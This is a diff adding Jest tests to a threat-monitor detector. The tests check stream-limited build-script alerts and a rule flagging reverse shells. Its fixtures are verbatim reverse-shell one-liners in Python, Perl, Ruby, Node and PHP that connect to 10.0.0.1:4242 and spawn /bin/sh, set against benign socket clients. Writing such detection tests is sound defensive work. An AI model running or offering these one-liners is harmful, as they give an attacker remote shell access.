@@ -451,3 +451,86 @@ describe('Threatmon New Rules: Download-and-Execute & Persistence (Ola 2b)', () 
     expect(unitWriteMonitor.report().findings.some((f) => f.rule_id === 'PS-005')).toBe(true);
   });
 });
+
+describe('Threatmon Revision 1: Stream-limited BG-001 & Scripting Reverse Shells', () => {
+  test('BG-001: diff --git a/scripts/build.sh on stdout does not trip, while on patch stream it trips', () => {
+    const stdoutMonitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    stdoutMonitor.observe('stdout', 'diff --git a/scripts/build.sh b/scripts/build.sh\n--- a/scripts/build.sh\n+++ b/scripts/build.sh');
+    const stdoutReport = stdoutMonitor.report();
+    expect(stdoutReport.tripped).toBe(false);
+    expect(stdoutReport.findings.some((f) => f.rule_id === 'BG-001')).toBe(false);
+
+    const patchMonitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    patchMonitor.observe('patch', 'diff --git a/scripts/build.sh b/scripts/build.sh\n--- a/scripts/build.sh\n+++ b/scripts/build.sh');
+    const patchReport = patchMonitor.report();
+    expect(patchReport.tripped).toBe(true);
+    expect(patchReport.findings.some((f) => f.rule_id === 'BG-001')).toBe(true);
+  });
+
+  test('RS-006: detects python one-liner reverse shell', () => {
+    const monitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    monitor.observe('stdout', 'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\'10.0.0.1\',4242));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\'/bin/sh\')"');
+    const rep = monitor.report();
+    expect(rep.tripped).toBe(true);
+    expect(rep.findings.some((f) => f.rule_id === 'RS-006')).toBe(true);
+  });
+
+  test('RS-006: detects perl one-liner reverse shell', () => {
+    const monitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    monitor.observe('stdout', 'perl -e \'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');
+    const rep = monitor.report();
+    expect(rep.tripped).toBe(true);
+    expect(rep.findings.some((f) => f.rule_id === 'RS-006')).toBe(true);
+  });
+
+  test('RS-006: detects ruby one-liner reverse shell', () => {
+    const monitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    monitor.observe('stdout', 'ruby -rsocket -e \'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
+    const rep = monitor.report();
+    expect(rep.tripped).toBe(true);
+    expect(rep.findings.some((f) => f.rule_id === 'RS-006')).toBe(true);
+  });
+
+  test('RS-006: detects node one-liner reverse shell', () => {
+    const monitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    monitor.observe('stdout', 'node -e \'const net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);const client=new net.Socket();client.connect(4242,"10.0.0.1",()=>{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});\'');
+    const rep = monitor.report();
+    expect(rep.tripped).toBe(true);
+    expect(rep.findings.some((f) => f.rule_id === 'RS-006')).toBe(true);
+  });
+
+  test('RS-006: detects php one-liner reverse shell', () => {
+    const monitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    monitor.observe('stdout', 'php -r \'$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");\'');
+    const rep = monitor.report();
+    expect(rep.tripped).toBe(true);
+    expect(rep.findings.some((f) => f.rule_id === 'RS-006')).toBe(true);
+  });
+
+  test('RS-006 negative: legitimate socket clients without shell do not trip', () => {
+    // Python socket client
+    const pyMonitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    pyMonitor.observe('stdout', 'python3 -c "import socket; s = socket.socket(); s.connect((\'127.0.0.1\', 8080)); s.sendall(b\'PING\'); s.close()"');
+    expect(pyMonitor.report().tripped).toBe(false);
+
+    // Perl socket client
+    const perlMonitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    perlMonitor.observe('stdout', 'perl -MIO::Socket -e \'$sock = IO::Socket::INET->new("localhost:8080"); print $sock "ping\\n";\'');
+    expect(perlMonitor.report().tripped).toBe(false);
+
+    // Ruby socket client
+    const rubyMonitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    rubyMonitor.observe('stdout', 'ruby -rsocket -e \'s = TCPSocket.new("localhost", 8080); s.puts("GET / HTTP/1.0"); puts s.read; s.close\'');
+    expect(rubyMonitor.report().tripped).toBe(false);
+
+    // Node socket client
+    const nodeMonitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    nodeMonitor.observe('stdout', 'node -e \'const net = require("net"); const client = net.connect(8080, "127.0.0.1", () => { client.write("hello"); client.end(); });\'');
+    expect(nodeMonitor.report().tripped).toBe(false);
+
+    // PHP socket client
+    const phpMonitor = new ThreatMonitor(defaultRules(), 'HIGH');
+    phpMonitor.observe('stdout', 'php -r \'$fp = fsockopen("127.0.0.1", 8080, $errno, $errstr, 30); fwrite($fp, "HEAD / HTTP/1.0\\r\\n\\r\\n"); echo fread($fp, 512); fclose($fp);\'');
+    expect(phpMonitor.report().tripped).toBe(false);
+  });
+});
